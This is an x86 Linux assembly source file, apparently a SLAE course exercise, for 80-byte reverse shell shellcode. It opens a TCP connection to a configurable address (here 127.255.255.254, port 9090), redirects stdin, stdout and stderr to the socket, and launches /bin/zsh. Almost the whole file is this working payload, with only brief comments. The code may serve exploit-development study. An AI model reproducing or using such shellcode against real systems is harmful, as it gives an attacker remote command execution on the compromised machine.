;
; Linux x86
; Author:  thryb
; Date:    21-07-16
; Purpose: Reverse /bin/zsh to TCP port 9090
; Size:    80 bytes
; ID:      SLAE-770
; Git:     https://www.github.com/thryb/SLAE-770
; 


global _start

section .text

_start:

	xor eax, eax ; cleaning registers
	xor ebx, ebx

	; 1 - create socket
        ; socket(AF_INET, SOCK_STREAM, 0);
        ; #define SYS_SOCKET      1               /* sys_socket(2) */
	push eax ; null terminate
	push byte 0x1 ; stack = 0, 1 
	push byte 0x2 ; stack = 0, 1, 2 (0, SOCK_STREAM, AF_INET)
	mov al, 0x66 ; sys_socketcall = 102
	mov bl, 0x1 ; socketcall() socket = 1
	mov ecx, esp ; mv stack ptr into ecx
	int 0x80 ; init

	xchg esi, eax ; saving sockfd
	
	; 2 - Connect 
	; connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

	mov al, 0x66 ; sys_socketcall = 102
	add ebx, 0x2 ; sys_connect = 3
	push 0xefffff7f ; 127.255.255.254 (ip2shell.py)
	push word 0x8223 ; 9090 (port2shell.py)
	push word 0x2 ; 2 AF_INET
	mov ecx, esp ; mv stack ptr to ecx
	push 0x10 ; addr leght 16
	push ecx ; ptr address
	push esi ; fd
	mov ecx, esp ;  mv final stack ptr to ecx
	int 0x80 ; init

	xchg eax, esi   ; save sockfd 

        ; 3 - dup
        ; sys_dup2 = 63 = 0x3f

        xor ecx, ecx    ; NULL ecx
        add cl, 0x2     ; add 2 to counter

        dup2: ; STDIN, STDOUT, STDERR
                mov al, 0x3f    ; sys_dup2
                int 0x80        ; init
                dec cl          ; decrement counter
                jns dup2        ; Jump on No Sign (Positive)

	; 4 - execve /bin/zsh
        ; normal execve shell exec

        push eax ; null
        push 0x68737a2f ; hsz/
        push 0x6e69622f ; nib/
	mov ebx, esp ; mv stack ptr to ebx
	push eax ; null
	push ebx ; push ptr addr
	mov ecx, esp ; mv new stack ptr to ecx
        mov al, 0xb     ; sys_execve (11)
        int 0x80        ; init


